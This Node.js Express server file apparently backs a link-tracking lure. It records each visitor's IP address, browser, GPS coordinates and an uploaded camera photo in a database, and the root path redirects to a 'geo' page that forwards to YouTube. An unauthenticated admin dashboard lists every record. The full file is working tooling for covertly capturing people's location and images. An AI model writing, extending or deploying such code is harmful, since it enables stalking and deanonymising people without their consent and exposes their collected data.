const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files from public/ and images/
app.use(express.static('public'));
app.use('/images', express.static('images'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Create upload directory if it doesn't exist
if (!fs.existsSync('images')) {
  fs.mkdirSync('images');
}

// SQLite setup
const db = new sqlite3.Database('logs.db');
db.run(`CREATE TABLE IF NOT EXISTS logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  timestamp TEXT,
  ip TEXT,
  user_agent TEXT,
  latitude TEXT,
  longitude TEXT,
  image_path TEXT
)`);

// Multer config (stores files in /images)
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'images'),
  filename: (req, file, cb) => {
    const filename = `visitor-${Date.now()}.jpg`;
    cb(null, filename);
  }
});
const upload = multer({ storage });

// Logging endpoint
app.post('/log', upload.single('photo'), (req, res) => {
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const ua = req.body.ua || 'Unknown';
  const lat = req.body.lat || 'N/A';
  const lon = req.body.lon || 'N/A';
  const time = new Date().toISOString();
  const imgPath = req.file ? req.file.filename : null;

  db.run(`INSERT INTO logs (timestamp, ip, user_agent, latitude, longitude, image_path) VALUES (?, ?, ?, ?, ?, ?)`,
    [time, ip, ua, lat, lon, imgPath],
    err => {
      if (err) {
        console.error('DB Error:', err);
        return res.sendStatus(500);
      }
      res.sendStatus(200);
    });
});

// Admin dashboard
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.get('/admin/dashboard', (req, res) => {
  db.all('SELECT * FROM logs ORDER BY id DESC', (err, rows) => {
    if (err) {
      return res.status(500).send('Database error');
    }
    res.render('dashboard', { logs: rows });
  });
});

app.get('/', (req, res) => {
  res.redirect('/geo.html?target=https://youtube.com');
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
